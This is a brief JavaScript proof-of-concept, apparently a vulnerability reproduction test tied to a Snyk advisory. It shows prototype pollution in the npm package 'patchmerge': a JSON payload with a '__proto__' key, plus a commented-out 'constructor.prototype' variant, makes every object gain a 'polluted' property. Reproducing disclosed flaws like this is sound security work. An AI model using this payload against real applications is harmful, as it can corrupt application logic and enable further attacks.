// //https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
// test("prototype pollution in patchmerge", () => {
  const patchMerge = require("patchmerge");

console.log({}.polluted);

  let obj = {};
  //patchMerge(obj, JSON.parse('{ "constructor" :{"prototype": { "polluted": "yes" }}}'));
  patchMerge(obj, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));

console.log({}.polluted);
// });
